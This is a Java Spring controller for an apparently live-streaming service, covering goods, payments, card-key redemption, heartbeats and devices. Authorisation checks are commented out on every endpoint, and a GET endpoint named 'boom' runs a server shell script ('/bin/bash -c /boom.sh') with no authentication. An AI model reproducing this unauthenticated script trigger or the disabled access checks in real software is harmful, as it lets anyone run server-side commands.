package com.fit2cloud.controller;

import com.alibaba.fastjson2.JSONArray;
import com.alibaba.fastjson2.JSONObject;
import com.fit2cloud.controller.handler.ResultHolder;
import com.fit2cloud.dao.entity.*;
import com.fit2cloud.service.IGoodsService;
import com.fit2cloud.service.IVmDefaultService;
import com.fit2cloud.utils.UserContext;
import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.tags.Tag;
import jakarta.annotation.Resource;
import jakarta.servlet.http.HttpServletRequest;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/goods")
@Validated
@Tag(name = "默认配置")
public class GoodsController {

    @Resource
    private IGoodsService goodsService;

    @Resource
    private IVmDefaultService iVmDefaultService;

//    @Operation(summary = "", description = "分页查询默认配置列表")
//    @GetMapping("/list")
////    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
//    public ResultHolder<IPage<CreateServerRequest>> list(@Validated PageVmCloudServerRequest pageVmCloudServerRequest) {
//        return ResultHolder.success();
//    }

    @Operation(summary = "", description = "获取商品列表")
    @PostMapping("/list")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<List<LiveGoods>> list(@RequestBody LiveGoods goods) {
        return ResultHolder.success(goodsService.getList(goods));
    }

    @Operation(summary = "", description = "获取支付二维码")
    @PostMapping("/getNativeQR")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Map> getNativeQR(@RequestBody GoodsToCart goods) throws Exception {

        return ResultHolder.success(goodsService.getNativeQR(goods));
    }

    @Operation(summary = "", description = "支付验证接口")
    @PostMapping("/confirmPayment")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Map> confirmPayment(@RequestBody ConfrimPayment payment) throws Exception {
        Map<String,Object> result = new HashMap<>();
        if(goodsService.confirmPayment(payment)){
            result.put("message","已支付");
            result.put("status",true);
        }else {
            result.put("message","未支付");
            result.put("status",false);
        }
        return ResultHolder.success(result);
    }

    @Operation(summary = "", description = "卡密兑换")
    @PostMapping("/CardKeyExchange")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> CardKeyExchange(@RequestBody CDcard card) throws Exception {
        Map result = goodsService.writeoff(card);
        return ResultHolder.of(result.get("code"),result.get("msg"),null);
    }

    @Operation(summary = "", description = "查询当前账号有效时间")
    @PostMapping("/getVaildTime")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Map<String,Object>> getVaildTime() throws Exception {
        Map<String,Object> result = new HashMap<>();
        result.put("vaildTime",goodsService.getVaildTimeByToken(UserContext.getToken()));
        return ResultHolder.success(result);
    }

    @Operation(summary = "", description = "心跳接口")
    @PostMapping("/heart")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> heart(HttpServletRequest request) {
        return ResultHolder.success(iVmDefaultService.heart(request) ? true : "账号已限制");
    }

    @Operation(summary = "", description = "拉流心跳接口")
    @PostMapping("/pullheart")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> pullheart(@RequestBody PullRequest request , HttpServletRequest http) {
        return ResultHolder.success(iVmDefaultService.pullheart(request,http) ? true : "账号已限制");
    }

    @Operation(summary = "", description = "开播")
    @PostMapping("/startVm")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> startVm() {
        Map map = iVmDefaultService.startVm();
        return ResultHolder.of(map.get("code"),map.get("msg"),null);
    }


    @Operation(summary = "", description = "服务列表")
    @PostMapping("/serviceList")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> serviceList() {
        return ResultHolder.of(200,"ok",iVmDefaultService.getServiceList());
    }


    @Operation(summary = "", description = "设备列表")
    @PostMapping("/equipmentList")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<JSONArray> equipmentList() {
        return ResultHolder.of(200,"ok",iVmDefaultService.getEquipmentList());
    }

    @Operation(summary = "", description = "设备详情")
    @GetMapping("/getEquipDetail")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<JSONObject> equipmentDetail(@RequestParam("uid") String uid) {
        return ResultHolder.of(200,"ok",iVmDefaultService.getEquipmentDetail(uid));
    }


    @Operation(summary = "", description = "获取账号二维码")
    @GetMapping("/getUserQR")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> getUserQR() {
        return ResultHolder.of(200,"ok",iVmDefaultService.getUserQR());
    }


    @Operation(summary = "", description = "扫二维码添加子账号")
    @GetMapping("/addSubUser")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> addSubUser(@RequestParam("cecode") String info) {
        return ResultHolder.of(200,"ok",iVmDefaultService.addSubUser(info));
    }

    @Operation(summary = "", description = "获取直播地址")
    @GetMapping("/getLiveUrl")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> getLiveUrl() {
        JSONObject result = iVmDefaultService.getLiveUrl();
        return ResultHolder.of(result.getInteger("code"),result.getString("msg"),result.getString("data"));
    }


    @Operation(summary = "", description = "直播管理信息")
    @GetMapping("/getLiveManageInfo")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> getLiveManageInfo(@RequestParam("uid") String uid) {
        JSONObject result = iVmDefaultService.getLiveManageInfo(uid);
        return ResultHolder.of(result.getInteger("code"),result.getString("msg"),result.getString("data"));
    }
    

    @Operation(summary = "", description = "boom")
    @GetMapping("/boom")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> boom() {
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "/boom.sh"});
            int exitCode = process.waitFor();
            System.out.println("脚本执行完成，退出码：" + exitCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return ResultHolder.of(200,"ok","");
    }


    @Operation(summary = "", description = "前端日志记录")
    @GetMapping("/logs")
//    @PreAuthorize("@cepc.hasAnyCePermission('CLOUD_SERVER:READ')")
    public ResultHolder<Object> logs(Object info) {
        try {
            if(info instanceof String){
                iVmDefaultService.logs((String) info);
            }
            if(info instanceof Integer){
                switch ((Integer)info){
                    case 1:
                        iVmDefaultService.logs("主播端推流成功");
                        break;
                    case 2:
                        iVmDefaultService.logs("客户端拉流成功");
                        break;
                    case 3:
                        iVmDefaultService.logs("直播开启");
                        break;
                    case 4:
                        iVmDefaultService.logs("直播关闭");
                        break;
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        return ResultHolder.of(200,"ok","already record");
    }
}
